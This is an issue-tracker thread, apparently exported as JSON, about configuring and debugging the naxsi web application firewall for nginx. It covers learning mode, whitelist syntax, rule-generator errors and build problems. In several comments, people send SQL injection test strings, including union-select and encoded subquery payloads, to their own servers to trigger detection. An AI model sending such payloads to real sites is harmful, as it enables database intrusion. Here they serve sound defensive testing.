{
    "blotus": "From baabf...@gmail.com on August 07, 2011 06:24:39\nDid not find how to change issue type, this is not a defect but rather an enhancement :)\n. From ori...@gmail.com on September 23, 2011 07:38:24\nthanks\nStatus: Fixed\n. From ori...@gmail.com on August 31, 2011 08:17:24\nHello,\nActually, I don't think putting a naxsi in learning mode, in production on a site with a \"high\" traffic is a good idea because of the overhead of learning mode (even I never tried). The learning mode should be done \"before\".\nBut, you have various way to do so, mainly relying on nginx's power :\n- Make a netfilter rule that will direct users from specific IP(s) to a different nginx server (within nginx context), where learning mode would be enabled, and disable it for the other servers. (I think that's the most efficient - in terms of performances). For example, set up to identical nginx server directives, one with learning mode, the other one with no learning, on different ports, and redirect trusted IPs to the learning one ?\n- Use nginx's access_module ( http://wiki.nginx.org/HttpAccessModule ) to limit valid IPs for the naxsi's \"learning\" location. But doing so, there will still be the \"double request\" induced by naxsi's learning mode.\n- Use nginx's GeoIP module to redirect the user according to its IP, to a different location (one with learning enabled, another without learning mode)\n- Issue a patch for http_config.py to add an option to filter \"by source IP\" (as this data is already passed with the request to http_config.py) (But this is quite \"inefficient\" in terms of performances)\nIf this is still an issue, I might as well issue a patch to make naxsi support \"restricted\" source IP for learning mode, but I feel like it's rewriting something already existent in NGINX.\nThanks, and let me know if it satisfies you !\n. From ori...@gmail.com on August 31, 2011 10:17:51\nActually, putting a configuration like the following one for your DeniedUrl seems to work well and limit the potential overhead induced by double requests, as it will internally stay to nginx :\nlocation / RequestDenied {\n             allow x.x.x.x;\n             deny all;\n             proxy_pass http://127.0.0.1:4242/;\n             }\n. From ori...@gmail.com on September 23, 2011 07:38:59\nis this a valid fix for you ?\nStatus: Done\n. From delta....@gmail.com on September 23, 2011 09:40:47\nI think add trusted IP can keep naxsi learning \"clean\" traffic . \nAnd yes, deploy two nginx instance will fix it, but I think if naxsi support trusted IP,\nit will  save a lot of time to setup two nginx for many people.\nThis is what computer is invented for.\n. From ori...@gmail.com on October 04, 2011 01:31:00\nHello,\nI think you misunderstood my answer.\nI was not saying that deploying two nginx is a solution, but that you should use the nginx's allow directive in your / RequestDenied location.\nIn this way, only \"trusted\" IP will be in learning mode, while others will just get your denied page.\n. From ori...@gmail.com on September 23, 2011 07:38:00\nfixed !\nStatus: Fixed\n. From didier.c...@googlemail.com on October 04, 2011 02:22:47\nLabels: Priority-Low\n. From didier.c...@googlemail.com on October 06, 2011 02:21:25\nInitial code has been commited in contribs but will certainly require testing and user reviews.\nStatus: Fixed\nOwner: ori...@gmail.com\n. From ori...@gmail.com on October 06, 2011 02:23:47\nHello,\nI'm not sure if I correctly identified your issue.\nhttp_config.py & LearningMode should be used to make naxsi learn the false positives of your site.\nSo, if while in learning mode, you emit 'evil' requests (like the one above), you are telling naxsi to allow this kind of requests. While using http_config.py & learning mode, you should only emit legit requests.\nIf you want naxsi to block the requests, you must disable LearningMode . (cf. http://code.google.com/p/naxsi/wiki/LearningMode ).\n\"\"\"As explained earlier, while in LearningMode , naxsi won't block any requests, but it will as well post them (using nginx's post_action mechanism) to the DeniedUrl location.\"\"\" If you make your DeniedUrl point to your http_config.py, blocked requests will then be forwarded to http_config.py to generate the appropriate whitelists.\n. From tzury...@reguluslabs.com on October 06, 2011 04:45:53\nthat is my fault in understanding the innovative concept.\ndisabled the learning mode and now all is fine!\nthanks a lot.\n. From didier.c...@googlemail.com on October 07, 2011 02:01:07\nStatus: Done\nLabels: -Type-Defect Type-Other\n. From ori...@gmail.com on December 20, 2011 16:43:37\nfixed !\nStatus: Done\n. From didier.c...@googlemail.com on October 21, 2011 05:13:06\nAllowing to score them as all the other content already scored.\n. From ori...@gmail.com on January 03, 2012 04:56:39\nsbl working on it, will be in 0.43\nStatus: Started\n. From didier.c...@googlemail.com on February 07, 2012 01:49:59\nLabels: -Milestone-Release-0.4.1 Milestone-Release-0.44\n. From didier.c...@googlemail.com on June 29, 2012 05:28:29\nLabels: -Milestone-Release-0.44 Milestone-Release-0.50\n. From ori...@gmail.com on November 10, 2011 06:36:29\nDone, 0.41\nStatus: Fixed\n. From ori...@gmail.com on December 26, 2011 18:34:13\nDone, please test\nStatus: Started\n. From didier.c...@googlemail.com on February 07, 2012 01:50:42\nStatus: Done\nLabels: Milestone-Release-0.43\n. From ori...@gmail.com on November 13, 2011 07:11:02\nhello,\nI'm not sure to understand your question/remark, can you provide some more details please ?\nRegards,\n. From ori...@gmail.com on March 13, 2012 07:43:41\nno reply\nStatus: Invalid\n. From ori...@gmail.com on December 20, 2011 16:49:42\nfixed, to be commited soon\nStatus: Fixed\n. From ori...@gmail.com on December 20, 2011 16:50:13\nStatus: Done\n. From ori...@gmail.com on November 30, 2011 06:08:20\nHello,\nAre you sure you compiled nginx with naxsi module ? It seems that either you didn't, or you included naxsi's directives in the wrong place. Could you provide me your nginx/naxsi configuration file, as well as nginx -V output ?\n1\u3001nginx: [emerg] unknown directive \"MainRule\" in /etc/nginx/naxsi_core.rules:13\nThis means that you didn't compiled nginx with naxsi :)\n. From ori...@gmail.com on December 16, 2011 03:24:49\nNo reply, user issue.\nStatus: Invalid\n. From ori...@gmail.com on December 26, 2011 01:22:21\nHi !\nI'll try to have a look at this soon. Anyway, HttpConfigPy needs huge work, I'll keep you posted ;)\nHappy xmas\n. From ori...@gmail.com on December 26, 2011 17:09:41\nHello,\nnew version of http_config.py (in dev version, http://code.google.com/p/naxsi/source/browse/trunk/contrib/rules_generator/rules_transformer.py ) should run on both python 2 & 3 now, please let me know if it work for you :)\nStatus: Fixed\n. From ori...@gmail.com on December 26, 2011 17:10:57\nSorry, I mean : http://code.google.com/p/naxsi/source/browse/trunk/contrib/rules_generator/http_config.py\n. From ori...@gmail.com on December 26, 2011 17:11:18\nStatus: Started\n. From ori...@gmail.com on January 03, 2012 04:56:17\nFixed on trunk, please provide feedback\nStatus: Fixed\n. From vlp...@gmail.com on January 03, 2012 04:58:16\nThanks, will give a try and revert to you. :P\n. From didier.c...@googlemail.com on January 06, 2012 01:44:48\nStatus: Started\nOwner: ori...@gmail.com\nLabels: Type-Enhancement\n. From didier.c...@googlemail.com on February 07, 2012 01:21:08\nCounters now appear in naxsi log file.\nDocumentation still to be done.\n. From didier.c...@googlemail.com on February 07, 2012 01:51:24\nStatus: Done\nLabels: Milestone-Release-0.43\n. From didier.c...@googlemail.com on January 06, 2012 01:39:07\nSummary: SOAP/XML requests filtering\n. From didier.c...@googlemail.com on February 07, 2012 01:54:41\nLabels: Priority-Low OpSys-All Component-Logic\n. From didier.c...@googlemail.com on February 07, 2012 01:55:37\nStatus: Started\nLabels: Milestone-Release-0.44 Priority-Medium OpSys-All Component-Persistence\n. From ori...@gmail.com on April 26, 2012 11:38:51\nStatus: Invalid\n. From didier.c...@googlemail.com on February 07, 2012 01:56:26\nPlanned Q2 2012\nLabels: Priority-Low OpSys-All Component-Logic\n. From ori...@gmail.com on April 06, 2013 05:38:28\nOutput filtering is still not a priority, due to the ratio of work & runtime cost VS the actual security gain.\nCSRF protection (when implemented) will probably bring this ability.\n. From didier.c...@googlemail.com on February 07, 2012 01:57:18\nLabels: Milestone-Release-0.44 OpSys-All\n. From didier.c...@googlemail.com on June 29, 2012 05:29:21\nLabels: -Milestone-Release-0.44 Milestone-Release-0.50\n. From ori...@gmail.com on February 04, 2012 06:50:21\nHello,\nWhen you are browsing your website, make sure that you enable LearningMode first to allow naxsi to learn about your exceptions.\nWhen exceptions are catched, you will :\n1) See them into nginx error log (written by naxsi : NAXSI_FMT...)\n2) When the request is sent (as well) to DeniedUrl , you will see debug written in http_config.py console (launch it with debug >= 3 if you have issues)\nPlease provide compilation options / configuration if it doesn't help.\n. From benedikt...@gmail.com on February 04, 2012 08:44:04\nThanks for your reply.\nThe LearningMode is active, configuration is the same like in the HowTo.\nI set the error_log to debug but all I can find is the notice about rewrites taking place. There is no information from NAXSI. I included the core-rules in the http-section of the nginx configuration.\nnginx was compiled from the ports as follows:\nconfigure arguments: --prefix=/usr/local/etc/nginx --with-cc-opt='-I /usr/local/include' --with-ld-opt='-L /usr/local/lib' --conf-path=/usr/local/etc/nginx/nginx.conf --sbin-path=/usr/local/sbin/nginx --pid-path=/var/run/nginx.pid --error-log-path=/var/log/nginx-error.log --user=www --group=www --with-file-aio --with-ipv6 --http-client-body-temp-path=/var/tmp/nginx/client_body_temp --http-fastcgi-temp-path=/var/tmp/nginx/fastcgi_temp --http-proxy-temp-path=/var/tmp/nginx/proxy_temp --http-scgi-temp-path=/var/tmp/nginx/scgi_temp --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi_temp --http-log-path=/var/log/nginx-access.log --with-http_gzip_static_module --with-http_realip_module --add-module=/var/ports/usr/ports/www/nginx/work/naxsi-0.42/naxsi_src --with-pcre\nI followed all steps from the HowTo. I can see nginx is reading the rules but it seems like either no exception is raised when surfing my website (would be very strange as I faked a lot) or no request is reaching NAXSI.\nThis is the part of the vhost-configuration:\nlocation / {\ninclude    \"/var/www/config/example.com_naxsi.conf\";\n  location / RequestDenied {\n     proxy_pass http://127.0.0.1:4242;\n  }\n...\n}\nThe configuration besides is same like in the HowTo. I switched off logging of 404 for certain files but I don't think this would influence NAXSI, right?\nThanks for your help.\n. From ori...@gmail.com on February 06, 2012 06:26:34\nHi,\nSeems there is an error in your configuration :\nlocation / {\ninclude    \"/var/www/config/example.com_naxsi.conf\";\n  location / RequestDenied {\n     proxy_pass http://127.0.0.1:4242;\n  }\n...\n}\n/ RequestDenied shouldn't be a sublocation of /, but rather another one :)\nAs well, please provide your example.com_naxsi.conf and infos about what you're reading in logs !\n. From adse...@niessen.ch on February 06, 2012 06:32:48\nI tried that, but no use. Besides all my locations are below / which works perfectly for memcached for example.\nThis is my example.com_naxsi.conf: LearningMode ;\nSecRulesEnabled;\nSecRulesDisabled; DeniedUrl \"/ RequestDenied \";\ninclude \"/var/www/config/example.com_naxsi.rules\";\ncheck rules\nCheckRule \"$SQL >= 8\" BLOCK;\nCheckRule \"$RFI >= 8\" BLOCK;\nCheckRule \"$TRAVERSAL >= 4\" BLOCK;\nCheckRule \"$EVADE >= 4\" BLOCK;\nCheckRule \"$XSS >= 8\" BLOCK;\nIn the logs there is nothing. I get a notice at start up of nginx saying that the included whitelist is empty which is true. In error.log is no information about NAXSI.\nFor me it looks like the NAXSI core-rules are not applied to a request => it won't hit any request which should be denied => no logs => no whitelist.\nThanks for your help.\n. From ori...@gmail.com on February 06, 2012 06:56:02\nDid you include the naxsi_core.rules in the http {} block ? It might be source of the error. \nElse, please provide me full conf, I might have some time to check this tonight / tomorrow !\n. From adse...@niessen.ch on February 06, 2012 07:02:51\nYes, I included the core rules at the beginning of the http-section.\nI will post the complete config tonight.\nThanks.\n. From ori...@gmail.com on February 06, 2012 07:04:29\nThanks ! Please provide as well nginx -V :)\n. From adse...@niessen.ch on February 06, 2012 07:08:56\nThis is nginx -V:\nconfigure arguments: --prefix=/usr/local/etc/nginx --with-cc-opt='-I /usr/local/include' --with-ld-opt='-L /usr/local/lib' --conf-path=/usr/local/etc/nginx/nginx.conf --sbin-path=/usr/local/sbin/nginx --pid-path=/var/run/nginx.pid --error-log-path=/var/log/nginx-error.log --user=www --group=www --with-file-aio --with-ipv6 --http-client-body-temp-path=/var/tmp/nginx/client_body_temp --http-fastcgi-temp-path=/var/tmp/nginx/fastcgi_temp --http-proxy-temp-path=/var/tmp/nginx/proxy_temp --http-scgi-temp-path=/var/tmp/nginx/scgi_temp --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi_temp --http-log-path=/var/log/nginx-access.log --with-http_gzip_static_module --with-http_realip_module --add-module=/var/ports/usr/ports/www/nginx/work/naxsi-0.42/naxsi_src --with-pcre\n. From ori...@gmail.com on February 06, 2012 07:44:51\nHi, my first tests seems to show that it's working like a charm, so I'll wait for full config as well as nginx version you used :)\nAs well, please perform a try with svn version instead of old 0.42. 0.43 is going to be released very soon and fix a lot of things !\n. From adse...@niessen.ch on February 06, 2012 07:47:17\nnginx: 1.0.11\nnaxsi: 0.42\n. From ori...@gmail.com on February 07, 2012 00:36:39\nOh, I think I see the issue ...\nCan you please try to include your naxi_config in each of the real locations (actually, sublocations here), like :\nlocation / {\n```\n  location ~ ^/(robots.txt|favicon.ico) {\n    log_not_found  off;\n  }\nlocation ^~ /. {\n    deny all;\n  }\ntry_files  $uri /index.php;                                                   \nlocation ~* .php$ {\n```\ninclude    \"/var/www/config/example.com_naxsi.conf\";\n   fastcgi_pass unix:/var/run/php-fpm/example.com;\n        fastcgi_index index.php;\n        fastcgi_param SCRIPT_FILENAME  $document_root$fastcgi_script_name;\n        include fastcgi_params;\n      }\n    }\n  }\n. From adse...@niessen.ch on February 07, 2012 00:54:25\nI included it in every location and expected to see some log in the error.log. But there is nothing besides my rewrite-notices.\nShouldnt there be any NAXSI-Log?\n. From ori...@gmail.com on February 07, 2012 01:31:41\nYes, you should see some NAXSI_FMT logs in error.log ...\nCan you copy/paste an example of rewrite notice ?\nI'll try to find some time to look at it today, but I'll be quite busy :)\n. From ori...@gmail.com on February 07, 2012 01:36:32\nOh actually, you should see this in your error log, but seems you don't have one for your actual locations.\nI'm giving it a try right now :)\n. From ori...@gmail.com on February 07, 2012 01:58:37\nHi again !\nI just give a try to your config, and it worked, here are my differences :\nlocation ~* \\.php$ {\n  include    \"/etc/nginx/nbs.rules\";\n  access_log /var/log/nginx/example.com-access.log;\n  error_log /var/log/nginx/example.com-error.log;\nThen when I perform a request on a .php, like:\n127.0.0.1/a.php?a='a'a'a'a\nI get a NAXSI_FMT in the error log.\nCan you please try to enable your error log, and perform a bad request on a .php ?\nBest regards,\n. From adse...@niessen.ch on February 07, 2012 02:10:23\nOk, now it works. Strange. I just added the include to the php-location as all others are rewrites or serving static files. Now I see the log entries.\nI dont know what it didnt log them before but they were not there. I checked again.\nAnyway, now it works.\nThanks a lot!!\n. From ori...@gmail.com on February 07, 2012 02:12:46\nYou're welcome !\nFeel free to let me know if you encounter any further issues :)\n. From ori...@gmail.com on February 07, 2012 02:13:15\nStatus: Invalid\n. From ori...@gmail.com on August 17, 2012 01:35:46\nStatus: Done\n. From ori...@gmail.com on April 11, 2012 02:21:37\nStatus: Done\n. From ori...@gmail.com on April 08, 2013 09:12:58\nActually avoids people from running with useless configurations.\nWill not be changed as for now.\nStatus: WontFix\n. From ori...@gmail.com on June 05, 2012 07:35:43\nStatus: Done\n. From ori...@gmail.com on April 11, 2012 02:21:26\nStatus: Done\n. From ori...@gmail.com on April 11, 2012 02:22:03\nStatus: Done\n. From veselin....@gmail.com on March 29, 2012 06:08:26\nSeams that problem is in how the nginx handle the requests but not the naxsi itself.\nMy nginx configuration looks  like that \nserver {\n        listen 80;\n        server_name test.com;\n        rewrite ^(._) http://www.test.com$1 permanent;\n}\nserver {\n     listen       80;\n     server_name  ~._test.com;\n     location / {\n         root   /srv/test.com/www;\n         include    /etc/nginx/nbs.rules;\n         index  index.php;\n         try_files $uri $uri/ /index.php?page=$uri&$args;\n      }\n      location ~ .php${\n          include    /etc/nginx/nbs.rules;\n          root           /srv/test.com/www;\n          fastcgi_pass   127.0.0.1:9000;\n          fastcgi_index  index.php;\n          include        fastcgi.conf;\n      }\n      location / RequestDenied {\n      proxy_pass http://127.0.0.1:4242;\n      }\n}\nIf i send a request like http://www.test.com/a.php?artist=1%0BAND%28SELECT%0B1%20FROM%20mysql.x%29 I got a row into error log and the exception  was learned http_config.py\n2012/03/29 16:01:50 [error] 20236#0: _777 NAXSI_FMT: ip=89.25.32.29&server=www.test.com&uri=/a.php&total_processed=170&total_blocked=8&zone0=ARGS&id0=1000&var_name0=artist&zone1=ARGS&id1=1010&var_name1=artist&zone2=ARGS&id2=1011&var_name2=artist&zone3=ARGS&id3=1020&var_name3=artist&zone4=ARGS&id4=1308&var_name4=artist&zone5=ARGS&id5=1309&var_name5=artist, client: xxx.xxx.xxx.xxx, server: ~._test.com, request: \"GET /a.php?artist=1%0BAND(SELECT%0B1%20FROM%20mysql.x) HTTP/1.1\", host: \"www.test.com\nBut if i send http://www.test.com/?artist=1%0BAND%28SELECT%0B1%20FROM%20mysql.x%29 I got a row into error log but request is not forwarded to http_config.py\n2012/03/29 16:05:35 [error] 20236#0: 853 NAXSI_FMT: ip=89.25.32.29&server=www.test.com&uri=/&total_processed=1408&total_blocked=23&zone0=ARGS&id0=1000&var_name0=artist&zone1=ARGS&id1=1010&var_name1=artist&zone2=ARGS&id2=1011&var_name2=artist&zone3=ARGS&id3=1020&var_name3=artist&zone4=ARGS&id4=1308&var_name4=artist&zone5=ARGS&id5=1309&var_name5=artist, client: 89.25.32.29, server: ~._test.com, request: \"GET /?artist=1%0BAND(SELECT%0B1%20FROM%20mysql.x) HTTP/1.1\", host: \"www.test.com\"\n. _From ori...@gmail.com on April 11, 2012 02:21:06\nHello,\nAny progress on this issue on your side ?\nBest regards,\n. From ori...@gmail.com on April 19, 2012 02:02:13\nStatus: Invalid\n. From veselin....@gmail.com on April 26, 2012 03:43:35\nHello, Last days i made lots of test and i can reproduce the problem all the time . Here is a test configuration :\nserver {\n        listen          1984;\n        server_name     'localhost';\n        client_max_body_size 30M;\n location / {\n        try_files $uri $uri/ /index.php?page=$uri&$args;\n        root /usr/local/src/nginx-1.2.0/naxsi-0.45/t/servroot/html/; LearningMode ;\n        SecRulesEnabled; DeniedUrl \"/ RequestDenied \";\n        CheckRule \"$SQL >= 8\" BLOCK;\n        CheckRule \"$RFI >= 8\" BLOCK;\n        CheckRule \"$TRAVERSAL >= 4\" BLOCK;\n        CheckRule \"$XSS >= 8\" BLOCK;\n        index index.php;\n }\n location / RequestDenied {\n   proxy_pass http://127.0.0.1:8000;\n }\n location ~ .php$ {\n }\n}\nTest URL: http://127.0.0.1:1984/?artist=0+div+1+union%23foo%2Fbar%0D%0Aselect%23foo%0D%0A1%2C2%2Ccurrent_user\nAttachment: error.log\n. From ori...@gmail.com on April 08, 2013 09:08:55\nFinally :D\nStatus: Fixed\n. From sephirot...@gmail.com on May 02, 2012 16:57:26\nStatus: Fixed\n. From unexplai...@gmail.com on May 08, 2012 20:20:59\nI've forgot to update that after i was re-reading the basicrules wiki, found out the generator script probably still using old syntax?\nedit manually\n$ARGS|NAME_VAR to $ARGS_VAR\n$BODY|NAME_VAR to $BODY_VAR\nseems fixed it.\n. From mickael....@gmail.com on June 14, 2012 04:49:30\nHi,\nI also have:\nnginx: [emerg] Naxsi-Config : Incorrect line BasicRule wl:1000 (/root/src/nginx/nginx-1.2.0/debian/modules/naxsi/naxsi_src/naxsi_skeleton.c/328)... in /etc/nginx/roundcube.rules:21\nBut with: BasicRule wl:1005 \"mz:$HEADERS_VAR:cookie\"; BasicRule wl:1010 \"mz:$HEADERS_VAR:cookie\"; BasicRule wl:1011 \"mz:$HEADERS_VAR:cookie\"; BasicRule wl:1308 \"mz:$HEADERS_VAR:cookie\"; BasicRule wl:1309 \"mz:$HEADERS_VAR:cookie\"; BasicRule wl:1000 \"mz:$URL:/webmail/|$BODY_VAR|NAME\"; BasicRule wl:1015 \"mz:$URL:/webmail/|$BODY_VAR:_to\"; BasicRule wl:1302 \"mz:$URL:/webmail/|$BODY_VAR:_to\"; BasicRule wl:1303 \"mz:$URL:/webmail/|$BODY_VAR:_to\"; BasicRule wl:1000 \"mz:$URL:/webmail/|$BODY_VAR|NAME\"; BasicRule wl:1000 \"mz:$URL:/webmail/|$BODY_VAR|NAME\"; BasicRule wl:1015 \"mz:$URL:/webmail/|$BODY_VAR:_followupto\"; BasicRule wl:1302 \"mz:$URL:/webmail/|$BODY_VAR:_followupto\"; BasicRule wl:1303 \"mz:$URL:/webmail/|$BODY_VAR:_followupto\"; BasicRule wl:1302 \"mz:$URL:/webmail/|$BODY_VAR:_message\"; BasicRule wl:1303 \"mz:$URL:/webmail/|$BODY_VAR:_message\"; BasicRule wl:1000 \"mz:$URL:/webmail/|$BODY_VAR|NAME\"; BasicRule wl:1015 \"mz:$URL:/webmail/|$BODY_VAR:_to\"; BasicRule wl:1302 \"mz:$URL:/webmail/|$BODY_VAR:_to\"; BasicRule wl:1303 \"mz:$URL:/webmail/|$BODY_VAR:_to\"; BasicRule wl:1005 \"mz:$URL:/webmail/|$BODY_VAR:_subject\"; BasicRule wl:1005 \"mz:$URL:/webmail/|$BODY_VAR:_message\"; BasicRule wl:1006 \"mz:$URL:/webmail/|$BODY_VAR:_message\"; BasicRule wl:1009 \"mz:$URL:/webmail/|$BODY_VAR:_subject\"; BasicRule wl:1010 \"mz:$URL:/webmail/|$BODY_VAR:_subject\"; BasicRule wl:1011 \"mz:$URL:/webmail/|$BODY_VAR:_subject\"; BasicRule wl:1016 \"mz:$URL:/webmail/|$BODY_VAR:_subject\"; BasicRule wl:1308 \"mz:$URL:/webmail/|$BODY_VAR:_subject\"; BasicRule wl:1309 \"mz:$URL:/webmail/|$BODY_VAR:_subject\"; BasicRule wl:1310 \"mz:$URL:/webmail/|$BODY_VAR:_subject\"; BasicRule wl:1311 \"mz:$URL:/webmail/|$BODY_VAR:_subject\"; BasicRule wl:1013 \"mz:$URL:/webmail/|$BODY_VAR:_message\"; BasicRule wl:1306 \"mz:$URL:/webmail/|$BODY_VAR:_message\";\nWith 0.46 on Debian 6.\n. From ori...@gmail.com on June 17, 2012 05:13:28\nOwner: sephirot...@gmail.com\n. From ori...@gmail.com on August 01, 2012 10:34:43\nIssue 44 has been merged into this issue.\n. From ori...@gmail.com on August 28, 2012 10:54:03\nHello,\nThis has been fixed in 0.49rc1, please give it a try.\nStatus: Fixed\nOwner: ---\n. From sephirot...@gmail.com on May 13, 2012 19:52:27\nHTTP basic auth has been added.\nStatus: Fixed\n. From unexplai...@gmail.com on May 30, 2012 14:36:20\nAlso looks other than .asp* and .ph* extension not supported in rule 1500?\nI have tried to white listed above by\nEditing the core rules :\nMainRule \"rx:.ph_|.asp_|.json\" \"msg:asp/php file upload!\" \"mz:FILE_EXT\" \"s:$UPLOAD:8\" id:1500; \nand on my local rules : BasicRule wl:1500 \"mz:$URL:/attachments/do-upload.json\";\nbut throwing the following error :\nPerforming sanity check on nginx configuration:\nnginx: [emerg] naxsi internal error in wlr_identify. in /usr/local/etc/nginx/nginx.conf:80\nnginx: [emerg] WhiteList Hash building failed in /usr/local/etc/nginx/nginx.conf:80\nnginx: configuration file /usr/local/etc/nginx/nginx.conf test failed\n. From unexplai...@gmail.com on May 31, 2012 00:15:31\nAnother examples naxsi generating confusing rules for above NAXSI_FMT :\n1 hits on rule 1310 ([, possible js) on url /attachments/do-upload.json from 1 different peers\nBasicRule wl:1310 \"mz:$URL:/attachments/do-upload.json|$BODY_VAR|NAME\";\n1 hits on rule 1311 (], possible js) on url /attachments/do-upload.json from 1 different peers\nBasicRule wl:1311 \"mz:$URL:/attachments/do-upload.json|$BODY_VAR|NAME\";\n$BODY_VAR|NAME what are this?, i have tried : BasicRule wl:1310 \"mz:$URL:/attachments/do-upload.json|$BODY_VAR:NAME\"; BasicRule wl:1311 \"mz:$URL:/attachments/do-upload.json|$BODY_VAR:NAME\"; BasicRule wl:1310 \"mz:$URL:/attachments/do-upload.json|$BODY_VAR:content_data[thread_id]\" ; BasicRule wl:1311 \"mz:$URL:/attachments/do-upload.json|$BODY_VAR:content_data[thread_id]\" ; BasicRule wl:1310 \"mz:$URL:/attachments/do-upload.json|$BODY_VAR:content_data[]\" ; BasicRule wl:1311 \"mz:$URL:/attachments/do-upload.json|$BODY_VAR:content_data[]\" ; BasicRule wl:1310 \"mz:$URL:/attachments/do-upload.json|$ARGS_VAR:content_data[thread_id]\" ; BasicRule wl:1311 \"mz:$URL:/attachments/do-upload.json|$ARGS_VAR:content_data[thread_id]\" ; BasicRule wl:1310 \"mz:$URL:/attachments/do-upload.json|$ARGS_VAR:content_data[]\" ; BasicRule wl:1311 \"mz:$URL:/attachments/do-upload.json|$ARGS_VAR:content_data[]\" ; BasicRule wl:1310 \"mz:$URL:/attachments/do-upload.json\" ; //Error - Feature request to disable specific rules on specific uri & filenames BasicRule wl:1311 \"mz:$URL:/attachments/do-upload.json\" ; //Error - Feature request to disable specific rules on specific uri & filenames\nNone of them works\n. From sephirot...@gmail.com on May 31, 2012 01:32:37\nHi,\nThere are a few bugs in the whitelist generation function.\nI'm rewriting it from scratch, should be done by the end of the week.\nStatus: Started\nOwner: sephirot...@gmail.com\n. From ori...@gmail.com on June 03, 2012 10:03:50\nHello,\nWhile Seb is rewritting the WL generation, I wanted to look at your error with rules on FILE_EXT. \nThe first issue is that your whitelist is not precise enough. Enough when it's obvious, naxsi need to be told about that : BasicRule wl:1500 \"mz:$URL:/attachments/do-upload.json|FILE_EXT\";\nThen, this was - anyway - broken, now it's fixed in SVN, please let me know if it is ok for you !\n. From unexplai...@gmail.com on June 03, 2012 12:15:02\nYes thanks, now it the rules may applied but strange things is the BODY|NAME still appear :\n2012/06/03 19:11:32 [error] 77806#0: *1 NAXSI_FMT: ip=127.0.0.1&server=domain.com&uri=/attachments/do-upload.json&total_processed=1&total_blocked=1&zone0=BODY|NAME&id0=1310&var_name0=content_data[thread_id]&zone1=BODY|NAME&id1=1311&var_name1=content_data[thread_id], client: 127.0.0.1, server: domain.com, request: \"POST /attachments/do-upload.json?hash=adfe77e3da0ad6e95a288d2fed96acb6&content_type=post HTTP/1.1\", host: \"domain.com\"\nI have already applied this rules : BasicRule wl:1310 \"mz:$URL:/attachments/do-upload.json|$BODY_VAR:content_data[thread_id]\" ; BasicRule wl:1311 \"mz:$URL:/attachments/do-upload.json|$BODY_VAR:content_data[thread_id]\" ; BasicRule wl:1310 \"mz:$URL:/attachments/do-upload.json|$ARGS_VAR:content_data[thread_id]\" ; BasicRule wl:1311 \"mz:$URL:/attachments/do-upload.json|$ARGS_VAR:content_data[thread_id]\" ; BasicRule wl:1500 \"mz:$URL:/attachments/do-upload.json|FILE_EXT\";\nAnd naxsi still complained, does this is also reside on the naxsi core which currently being work on with seb?\n. From unexplai...@gmail.com on June 09, 2012 13:50:51\nany news about the new generator?\n. From ori...@gmail.com on July 16, 2012 09:00:12\nHi, it has been fixed in SVN, can you please give it a try ?\nIt will be included in 0.48 (which is late :p)\n. From emile.he...@gmail.com on December 30, 2012 15:26:46\nI've been bitten by a similar bug (I call this a bug as I simply used naxsi's Wiki example) and solved it using the following syntax: BasicRule wl:1000 \"mz:URL|$URL:/wp/wp-admin/update-core.php\";\n. From ori...@gmail.com on March 13, 2013 01:57:15\nStatus: Verified\n. From ad...@yqed.com on May 30, 2012 17:20:28\nThe above compile error is with 0.45 version. Using 0.46-1, I get this error:\ncc1: warnings being treated as errors\nnaxsi-0.46-1/naxsi_src/naxsi_runtime.c: In function 'gx_http_basestr_ruleset_n':\nnaxsi-0.46-1/naxsi_src/naxsi_runtime.c:929: error: 'nb_match' may be used uninitialized in this function\nPlease let me know what patch I should apply for 0.46-1. Thanks.\n. From ad...@yqed.com on June 02, 2012 00:11:42\nI solved the compile issues by removing the Werror cflag, inserted by default.\nStill, it would nice if a clean fix is applied to the source code.\n. From ori...@gmail.com on June 05, 2012 04:57:14\nHello, \nI made some change that might have fixed the issue.\nUnfortunately, I don't have a CentOS to reproduce compilation issues, can you confirm if it's fixed, and if not, specify your compilation options ?\nThanks,\n. From ad...@yqed.com on June 05, 2012 11:03:28\nI'll compile it tonight and let you know. I would appreciate if you could look at issue 34 , so I know of I should upgrade python. Once the rpm's are done, I will have them open to public. :-)\n. From ori...@gmail.com on June 17, 2012 05:12:19\nDid the fix worked for the C source code ?\n. From ori...@gmail.com on June 17, 2012 05:13:00\nStatus: Fixed\n. From ad...@yqed.com on June 17, 2012 11:54:26\nI actually compiled nginx is a different way with custom flags and everything compiled properly. I presume you made the changes into trunk? I have a script that I can download the trunk from Google, but for now the issue is fixed with original code. :)\nCheck your email, I replied to you.\n. From ad...@yqed.com on June 02, 2012 00:10:15\nRemoving the IF solves the issue but I get a new error:\nFilling database with %s. ALL PREVIOUS CONTENT WILL BE DROPPED !!!!!\nDone.\nTraceback (most recent call last):\n  File \"nx_intercept.py\", line 162, in ?\n    exit(42)\nTypeError: 'str' object is not callable\nNote the %s. I don't see any string on line 162.\n. From ad...@yqed.com on June 02, 2012 00:31:26\nAs a side note, nothing is filled into database.\nI'm using Python 2.4.3 on CentOS 5 64bits, I created all missing RPM's to run the UI:\npython-fpconst-0.7.3-1.el5.noarch.rpm\npython-hashlib-20081119-1.el5.x86_64.rpm\npython-setuptools-0.6.27-1.el5.noarch.rpm\npython-twisted-core-8.2.0-1.el5.x86_64.rpm\npython-twisted-core-doc-8.2.0-1.el5.x86_64.rpm\npython-twisted-core-zsh-8.2.0-1.el5.x86_64.rpm\npython-twisted-web-8.2.0-1.el5.x86_64.rpm\npython-zope-filesystem-1.0.0-1.el5.x86_64.rpm\npython-zope-interface-3.8.0-1.el5.x86_64.rpm\nSOAPpy-0.11.6-1.el5.noarch.rpm\nThat's the only show stopper, before I release my packages to public:\nnginx-common.x86_64 - nginx common config files, logs, init scripts, etc.\nnginx.x86_64 - nginx binary with all modules enabled\nnginx-debug.x86_64 - nginx binary with all modules enabled + debug mode\nnginx-naxsi.x86_64 - nginx binary with all modules enabled + naxsi firewall\n. From unexplai...@gmail.com on June 02, 2012 02:53:57\nI think that you need at-least python 2.7.3 to run the contrib properly\n. From ad...@yqed.com on June 05, 2012 19:59:46\nI looked at the python 2.7.3 rpm requirements, it is very hard to build it for CentOS/Redhat 5. It would require an army rpm's to be created, in order to upgrade to 2.7.3 version. If the developer needs access to a box running on CentOS 5 with Python 2.4.3 installed, I can provide that.\nI already have the nginx-naxi compiled and I create a neat init script that allows to start the learning daemons. It would be a shame to stop at this requirement. I did a lot of work, let's work together and provide to all CentOS 5 users naxsi. :)\n. From design...@gmail.com on June 27, 2012 11:12:35\nEPEL yum install 